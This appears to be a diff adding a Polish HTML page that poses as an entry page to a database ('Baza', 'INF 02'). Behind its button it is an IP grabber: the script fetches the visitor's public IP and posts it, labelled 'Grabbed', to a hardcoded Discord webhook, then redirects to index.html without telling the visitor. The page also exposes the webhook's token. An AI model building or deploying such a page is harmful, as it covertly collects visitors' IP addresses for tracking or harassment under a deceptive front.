@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Baza</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 100px;
+        }
+        #ip {
+            font-size: 24px;
+            margin: 20px;
+            font-weight: bold;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            margin: 5px;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>INF 02</h1>
+    <div id="ip">Baza danych</div>
+
+    <button onclick="sendToDiscord()">Wejdz do bazy</button>
+
+    <script>
+        let currentIP = "";
+
+        // Pobieranie IP z API
+        fetch("https://api.ipify.org?format=json")
+            .then(response => response.json())
+            .then(data => {
+                currentIP = data.ip;
+            })
+            .catch(() => {
+                document.getElementById("ip").textContent = "Czekaj!";
+            });
+
+        // Funkcja kopiowania do schowka
+        function copyIP() {
+            if (!currentIP) return;
+
+            navigator.clipboard.writeText(currentIP)
+                .then(() => alert("Czekaj! " + currentIP))
+                .catch(() => alert("Czekaj!"));
+        }
+
+        // Funkcja wysyłania aktualnego IP do Discorda i przekierowanie
+        function sendToDiscord() {
+            // Zabezpieczenie na wypadek, gdyby ktoś kliknął zanim IP się załaduje
+            if (!currentIP) {
+                alert("Czekaj!");
+                return;
+            }
+
+            fetch("https://discord.com/api/webhooks/1514013803912630352/WSDMZ0hqcG6s9M8TTvptRjYjll1yYqRCNjdHCiSse6sRYOWr-34xIRTTpqqDkYNHFDxm", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    content: "Grabbed " + currentIP
+                })
+            })
+            .then(() => {
+                alert("Wchodzisz do strony");
+                // Przekierowanie do index.html po kliknięciu OK w alercie
+                window.location.href = "index.html"; 
+            })
+            .catch(err => {
+                console.error(err);
+                // Opcjonalnie: można tu też dodać przekierowanie w razie błędu wysyłania na Discord
+                alert("Wystąpił błąd, ale przechodzisz dalej.");
+                window.location.href = "index.html";
+            });
+        }
+    </script>
+
+</body>
+</html>
